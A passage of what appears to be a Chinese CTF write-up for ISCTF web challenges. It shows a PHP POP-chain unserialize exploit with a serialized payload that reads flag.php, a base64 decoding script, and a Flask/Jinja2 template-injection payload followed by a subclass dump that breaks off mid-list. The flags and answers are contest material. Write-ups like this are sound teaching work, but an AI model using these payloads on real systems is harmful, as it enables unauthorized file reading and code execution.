bash">/robot.txt<br>/flag_is_here.php<br>ISCTF&#123;g9kov44avqh5kjkes8d990t1y&#125;<br><br><br>新flag：<br>ISCTF&#123;ba2f7fa0-0727-4739-b883-ac609a0e5258&#125;<br></code></pre></td></tr></table></figure><h2 id="pop-unserialize"><a href="#pop-unserialize" class="headerlink" title="pop_unserialize"></a>pop_unserialize</h2><p>出题人：种花家</p><p>学校：乐山职业技术学院</p><p><a href="http://isctf.mcsog.tk:10003/unserialize.php">http://isctf.mcsog.tk:10003/unserialize.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>//flag.php<br>//MF师傅告诉我file_get_contents这个函数能输出flag.php里面的内容<br><br>class MF_is_cat&#123;<br>    private <span class="hljs-variable">$pop</span> = <span class="hljs-string">&quot;f00001111&quot;</span>;<br>    public <span class="hljs-variable">$MF</span> = <span class="hljs-string">&quot;miao~ miao~ miao~&quot;</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop =new ISCTF();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop-&gt;action();<br>    &#125;<br>&#125;<br><br>class ISCTF&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to ISCTF World!&quot;</span>;<br>    &#125;<br>&#125;<br><br>class Show&#123;<br>    var <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>       <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ISCTF&#x27;</span>]))&#123;<br>    unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ISCTF&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$obj</span> = new MF_is_cat();<br>    highlight_file(__FILE__);<br>    &#125;<br>?&gt;  Welcome to ISCTF World!<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>//flag.php<br>//MF师傅告诉我file_get_contents这个函数能输出flag.php里面的内容<br><br>class MF_is_cat&#123;<br>    public <span class="hljs-variable">$pop</span> = <span class="hljs-string">&quot;f00001111&quot;</span>;<br>    public <span class="hljs-variable">$MF</span> = <span class="hljs-string">&quot;miao~ miao~ miao~&quot;</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop =new Show();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop-&gt;action();<br>    &#125;<br>&#125;<br><br>class ISCTF&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to ISCTF World!&quot;</span>;<br>    &#125;<br>&#125;<br><br>class Show&#123;<br>    var <span class="hljs-variable">$test2</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>       <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$m</span>=new MF_is_cat();<br><br><span class="hljs-variable">$a</span>= serialize(<span class="hljs-variable">$m</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>;<br>?&gt; <br><br><br>POST:<br>ISCTF=O:9:<span class="hljs-string">&quot;MF_is_cat&quot;</span>:2:&#123;s:3:<span class="hljs-string">&quot;pop&quot;</span>;O:4:<span class="hljs-string">&quot;Show&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;test2&quot;</span>;s:8:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;s:2:<span class="hljs-string">&quot;MF&quot;</span>;s:17:<span class="hljs-string">&quot;miao~ miao~ miao~&quot;</span>;&#125;<br>O:9:<span class="hljs-string">&quot;MF_is_cat&quot;</span>:2:&#123;s:3:<span class="hljs-string">&quot;pop&quot;</span>;O:4:<span class="hljs-string">&quot;Show&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;test2&quot;</span>;s:2:<span class="hljs-string">&quot;la&quot;</span>;&#125;s:2:<span class="hljs-string">&quot;MF&quot;</span>;s:17:<span class="hljs-string">&quot;miao~ miao~ miao~&quot;</span>;&#125;<br><br><br>ISCTF&#123;MF_YYDS&#125;<br><br>新flag：<br>ISCTF&#123;ea2b37f4-ec87-4587-b11d-e55987dcb325&#125;<br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>//flag.php<br>//MF师傅告诉我file_get_contents这个函数能输出flag.php里面的内容<br><br>class MF_is_cat&#123;<br>    public <span class="hljs-variable">$pop</span>;<br>    public <span class="hljs-variable">$MF</span> ;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop =new ISCTF();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;pop-&gt;action();<br>    &#125;<br>&#125;<br>class ISCTF&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to ISCTF World!&quot;</span>;<br>    &#125;<br>&#125;<br>class Show&#123;<br>    var <span class="hljs-variable">$test2</span>=<span class="hljs-string">&#x27;la&#x27;</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">action</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;f&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;test2.<span class="hljs-string">&#x27;g.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span>=new MF_is_cat();<br><span class="hljs-variable">$exp</span>-&gt;pop=new Show();<br><span class="hljs-built_in">echo</span> serialize(<span class="hljs-variable">$exp</span>);<br><br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h2><p>观察源码，js源码一堆base编码，写个脚本跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding: UTF-8</span><br>import base64<br>list=[<span class="hljs-string">&#x27;dW1hc2s=&#x27;</span>,<span class="hljs-string">&#x27;YW1k&#x27;</span>,<span class="hljs-string">&#x27;VnVlUm91dGVy&#x27;</span>,<span class="hljs-string">&#x27;Y2xhc3NDYWxsQ2hlY2s=&#x27;</span>,.....,<span class="hljs-string">&#x27;Y3dk&#x27;</span>,<span class="hljs-string">&#x27;Y2hkaXI=&#x27;</span>,<span class="hljs-string">&#x27;cHJvY2Vzcy5jaGRpciBpcyBub3Qgc3VwcG9ydGVk&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list:<br>  m=base64.b64decode(i)<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ISCTF&quot;</span> <span class="hljs-keyword">in</span> str(m):<br>    <span class="hljs-built_in">print</span>(m)<br><br>b<span class="hljs-string">&#x27;You Win! This is your flag: ISCTF&#123;p1e2se_G4ME_n00ds_Gre4t_M!nd!&#125;&#x27;</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">flag：ISCTF&#123;p1e2se_G4ME_n00ds_Gre4t_M!nd!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy flask"></a>easy flask</h2><p>hint：尝试/wow目录，考虑因没有渲染模版文件导致恶意代码注入问题。参数为id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload：/wow/?id=&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br><span class="hljs-comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class 